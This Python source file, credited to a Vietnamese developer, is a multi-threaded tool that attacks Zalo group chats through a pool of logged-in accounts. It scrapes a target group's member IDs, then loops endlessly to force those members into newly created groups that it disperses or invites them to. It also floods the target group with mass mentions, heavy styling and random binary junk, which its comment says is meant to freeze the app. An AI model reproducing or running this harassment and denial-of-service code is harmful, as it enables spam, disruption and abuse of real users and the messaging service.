# * DEV KHÔI PHAN +
# Nhà Phát Triển Chính Thức & Độc Quyền
# Bản quyền © 2026

import os, json, time, random, base64, ctypes, secrets, threading, subprocess, platform, struct
from collections import defaultdict
from queue import Queue

class EXEbykhoiphan:
    _cpp_lib = None
    _rate_limits = defaultdict(list) 
    _lock = threading.RLock()

    @classmethod
    def _load_cpp_core(cls):
        if cls._cpp_lib is not None: return True
        try:
            base_dir = os.path.dirname(os.path.abspath(__file__))
            cpp_src = os.path.join(base_dir, "zalo_core.cpp")
            lib_ext = ".dll" if platform.system() == "Windows" else ".so"
            lib_path = os.path.join(base_dir, "zalo_core" + lib_ext)

            if not os.path.exists(lib_path) and os.path.exists(cpp_src):
                subprocess.run(["g++", "-shared", "-O3", "-fPIC", cpp_src, "-o", lib_path], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            if os.path.exists(lib_path):
                cls._cpp_lib = ctypes.CDLL(lib_path)
                cls._cpp_lib.build_binary_payload.restype = ctypes.POINTER(ctypes.c_uint8)
                cls._cpp_lib.build_binary_payload.argtypes = [ctypes.c_char_p, ctypes.c_char_p, ctypes.c_int, ctypes.POINTER(ctypes.c_int)]
                cls._cpp_lib.free_binary_payload.argtypes = [ctypes.POINTER(ctypes.c_uint8)]
                return True
        except: pass
        return False

    @classmethod
    def _fallback_cpp_struct(cls, gid, imei):
        """Nếu server không có g++, tự động dùng Python tạo Binary Struct tương tự C++"""
        buf = bytearray()
        buf.extend(struct.pack("<I", 0x5A4C4F32))
        buf.extend(struct.pack("<I", len(gid)) + gid.encode())
        buf.extend(struct.pack("<I", len(imei)) + imei.encode())
        buf.extend(struct.pack("<I", 5000)) # Node count
        for _ in range(5000):
            buf.extend(struct.pack("<I", random.randint(0, 0xFFFFFFFF)))
            payload = os.urandom(random.randint(32, 64))
            buf.extend(struct.pack("<H", len(payload)) + payload)
        buf.extend(struct.pack("<I", 0x454E4432))
        return base64.b64encode(bytes(buf)).decode('utf-8')

    @classmethod
    def _get_cpp_payload_b64(cls, gid, imei):
        if not cls._load_cpp_core():
            return cls._fallback_cpp_struct(gid, imei)
        try:
            out_len = ctypes.c_int(0)
            ptr = cls._cpp_lib.build_binary_payload(gid.encode(), imei.encode(), 10, ctypes.byref(out_len))
            if ptr:
                data = ctypes.string_at(ptr, out_len.value)
                cls._cpp_lib.free_binary_payload(ptr)
                return base64.b64encode(data).decode('utf-8')
        except: pass
        return cls._fallback_cpp_struct(gid, imei)

    @classmethod
    def _check_rate_limit(cls, key, max_req=40, window=1.0):
        with cls._lock:
            now = time.time()
            cls._rate_limits[key] = [t for t in cls._rate_limits[key] if now - t < window]
            if len(cls._rate_limits[key]) >= max_req:
                return False
            cls._rate_limits[key].append(now)
            return True

    @classmethod
    def get_all_uids(cls, zc, gid):
        uids, seen = [], set()
        my_uid = str(zc.uid or "").strip()
        try:
            active_s = getattr(zc, "prio_s", None) or zc.s
            enc = zc._enc({"gridVerMap": json.dumps({gid: 0})})
            r = active_s.post("https://tt-group-wpa.chat.zalo.me/api/group/getmg-v2",
                              params={"zpw_ver": 645, "zpw_type": 30}, data={"params": enc}, timeout=5)
            if r.status_code == 200 and r.content:
                dec = zc._dec(r.json().get("data", ""))
                obj = (json.loads(dec).get("data") or {}).get("gridInfoMap", {}).get(gid) or {}
                for v in [str(obj.get("creatorId"))] + [str(x) for x in (obj.get("adminIds") or [])]:
                    if v.isdigit() and v not in ("0", my_uid) and v not in seen: seen.add(v); uids.append(v)
                for m in (obj.get("currentMems") or []):
                    v = str(m.get("userId") or m.get("id") or "")
                    if v.isdigit() and v not in ("0", my_uid) and v not in seen: seen.add(v); uids.append(v)
        except: pass
        if my_uid: uids.append(my_uid)
        return uids

    # ============================================================
    # WORKER 1: KÉO MEM + GIẢI TÁN (Dùng chung Queue, không lo -32)
    # ============================================================
    @classmethod
    def _worker_trash_disperse(cls, task_queue, stop_ev, do_disperse=False):
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=1.0)
                zc, gid, target_uids, my_uid = task
                active_s = getattr(zc, "prio_s", None) or zc.s
                
                if not cls._check_rate_limit(f"trash_{zc.imei}", max_req=20, window=1.0):
                    time.sleep(0.05); task_queue.put(task); continue

                batch = target_uids[:35] + ([my_uid] if my_uid else [])
                if len(batch) < 2: continue

                vname = f"Box {secrets.token_hex(3)}"
                cli = int(time.time() * 1000) + random.randint(1, 9999)
                
                pl = {"clientId": cli, "gname": vname, "gdesc": None, "members": batch,
                      "membersTypes": [-1] * len(batch), "nameChanged": 1, 
                      "createLink": 1, "clientLang": "vi", "imei": zc.imei, "zsource": 601}
                enc = zc._enc(pl)
                r = active_s.post("https://tt-group-wpa.chat.zalo.me/api/group/create",
                                  params={"zpw_ver": 645, "zpw_type": 30}, data={"params": enc}, timeout=(1.5, 3.0))
                
                new_grid = ""
                if r.status_code == 200 and r.json().get("data"):
                    dec = json.loads(zc._dec(r.json()["data"]))
                    d = dec.get("data") if isinstance(dec.get("data"), dict) else dec
                    new_grid = str(d.get("groupId") or d.get("grid") or "")

                if new_grid.isdigit():
                    if do_disperse:
                        time.sleep(0.15)
                        dp_pl = {"grid": new_grid, "groupId": new_grid, "imei": zc.imei}
                        active_s.post("https://tt-group-wpa.chat.zalo.me/api/group/disperse",
                                      params={"zpw_ver": 645, "zpw_type": 30}, data={"params": zc._enc(dp_pl)}, timeout=(1.5, 3.0))
                    else:
                        invite_pl = {"grid": new_grid, "members": target_uids[:30], "memberTypes": [-1]*min(len(target_uids),30), "src": 2, "imei": zc.imei}
                        active_s.post("https://tt-group-wpa.chat.zalo.me/api/group/invite/v2",
                                      params={"zpw_ver": 645, "zpw_type": 30}, data={"params": zc._enc(invite_pl)}, timeout=(1.2, 2.5))
            except:
                time.sleep(0.05)

    @classmethod
    def start_trash_engine(cls, zc_pool, gid, stop_ev, do_disperse=False, num_workers=10):
        if not zc_pool: return
        uids = cls.get_all_uids(zc_pool[0], gid)
        if len(uids) < 2: return
        my_uid = str(zc_pool[0].uid or "")
        target_uids = [u for u in uids if u != my_uid]

        task_queue = Queue()
        for _ in range(num_workers):
            threading.Thread(target=cls._worker_trash_disperse, args=(task_queue, stop_ev, do_disperse), daemon=True).start()

        while not stop_ev.is_set():
            zc = random.choice(zc_pool)
            task_queue.put((zc, gid, target_uids, my_uid))
            time.sleep(0.01)

    # ============================================================
    # WORKER 2: MENTION BẰNG C++ (Làm Đơ App)
    # ============================================================
    @classmethod
    def _worker_mention(cls, task_queue, stop_ev):
        while not stop_ev.is_set():
            try:
                task = task_queue.get(timeout=1.0)
                zc, gid, uids = task
                active_s = getattr(zc, "prio_s", None) or zc.s
                
                if not cls._check_rate_limit(f"mention_{zc.imei}", max_req=15, window=1.0):
                    time.sleep(0.05); task_queue.put(task); continue

                cpp_b64 = cls._get_cpp_payload_b64(gid, zc.imei)
                m_arr = [{"pos": i, "len": 1, "uid": uids[i % len(uids)], "type": 0} for i in range(50)]
                
                pl = {"grid": gid, "message": cpp_b64[:2500], "clientId": int(time.time()*1000),
                      "imei": zc.imei, "ttl": 0, "visibility": 0,
                      "mentionInfo": json.dumps(m_arr, separators=(",", ":")),
                      "textProperties": json.dumps({"styles": [{"start": i*10, "len": 5, "st": "b,c_db342e"} for i in range(150)], "ver": 0})}
                active_s.post("https://tt-group-wpa.chat.zalo.me/api/group/mention",
                              params={"zpw_ver": 645, "zpw_type": 30}, data={"params": zc._enc(pl)}, timeout=(1.2, 2.5))
            except:
                time.sleep(0.05)

    @classmethod
    def start_mention_engine(cls, zc_pool, gid, stop_ev, num_workers=10):
        uids = cls.get_all_uids(zc_pool[0], gid)
        if not uids: return
        task_queue = Queue()
        for _ in range(num_workers):
            threading.Thread(target=cls._worker_mention, args=(task_queue, stop_ev), daemon=True).start()

        while not stop_ev.is_set():
            zc = random.choice(zc_pool)
            task_queue.put((zc, gid, uids))
            time.sleep(0.01)
